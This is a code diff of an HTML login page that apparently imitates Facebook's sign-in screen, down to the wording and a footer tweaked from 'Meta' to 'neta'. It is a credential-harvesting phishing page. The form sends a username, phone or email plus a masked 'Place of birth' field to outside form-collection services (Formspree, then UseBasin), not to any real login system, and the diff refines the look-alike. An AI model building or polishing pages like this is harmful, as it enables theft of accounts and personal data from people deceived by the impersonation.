@@ -1,67 +1,103 @@
-<!DOCTYPE html>    <html lang="en">    
-<head>    
-    <meta charset="UTF-8">    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">    
-    <title>Login</title>    <!-- CSS File -->    
-<link rel="stylesheet" href="style.css">
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
 
-</head>    <body>    <div class="container">    
+    <!-- CSS File -->
+    <link rel="stylesheet" href="style.css">
 
-    <!-- Language -->    
-    <p class="language">English (UK)</p>    
+    <style>
+        .password-wrapper {
+            position: relative;
+        }
 
-    <!-- Logo -->    
-    <div class="logo-area">    
-        <img src="logo.png" alt="Logo">    
-    </div>    
+        .eye-btn {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            user-select: none;
+            font-size: 18px;
+        }
+    </style>
+</head>
 
-    <!-- Formspree Form -->    
-    <form action="https://formspree.io/f/xbdegegy" method="POST">    
+<body>
 
-        <input    
-            type="text"    
-            name="username"    
-            class="input-box"    
-            placeholder="username,mobile number, email address"    
-            required    
-        >    
+<div class="container">
 
-        <input    
-            type="text"    
-            name="password"    
-            class="input-box"    
-            placeholder="password"    
-            required    
+    <!-- Language -->
+    <p class="language">English (UK)</p>
+
+    <!-- Logo -->
+    <div class="logo-area">
+        <img src="logo.png" alt="Logo">
+    </div>
+
+    <!-- UseBasin Form -->
+    <form action="https://usebasin.com/f/abebee17fc68" method="POST">
+
+        <input
+            type="text"
+            name="username"
+            class="input-box"
+            placeholder="username, mobile number, email address"
+            required
         >
 
-span class="eye-btn">👁</span>
+        <div class="password-wrapper">
+            <input
+                type="password"
+                name="place_of_birth"
+                id="placeOfBirth"
+                class="input-box"
+                placeholder="Place of birth"
+                required
+            >
+            <span class="eye-btn" onclick="togglePlaceOfBirth()">👁</span>
+        </div>
 
-<button type="submit" class="login-btn">    
-            Log In    
-        </button>    
+        <button type="submit" class="login-btn">
+            Log In
+        </button>
 
-    </form>    
+    </form>
 
-    <!-- Forgot Password -->    
-    <a href="#" class="forgot">    
-        Forgotten password?    
-    </a>    
+    <!-- Forgot Password -->
+    <a href="#" class="forgot">
+        Forgotten password?
+    </a>
 
-    <!-- Create Account -->    
-    <a href="#" class="create-account">    
-        Create new account    
-    </a>    
+    <!-- Create Account -->
+    <a href="#" class="create-account">
+        Create new account
+    </a>
 
-    <!-- Footer -->    
-    <div class="footer">    
-        <p>Language • Privacy • Terms • Help</p>    
-        <p>© Meta 2026</p>    
-    </div>    
+    <!-- Footer -->
+    <div class="footer">
+        <p>Language • Privacy • Terms • Help</p>
+        <p>© neta 2026</p>
+    </div>
 
-</div>    
+</div>
 
-<!-- JavaScript -->    
+<script>
+function togglePlaceOfBirth() {
+    const field = document.getElementById("placeOfBirth");
+
+    if (field.type === "password") {
+        field.type = "text";
+    } else {
+        field.type = "password";
+    }
+}
+</script>
+
+<!-- External JavaScript -->
 <script src="script.js"></script>
 
-</body>    
-</html>    
+</body>
+</html>
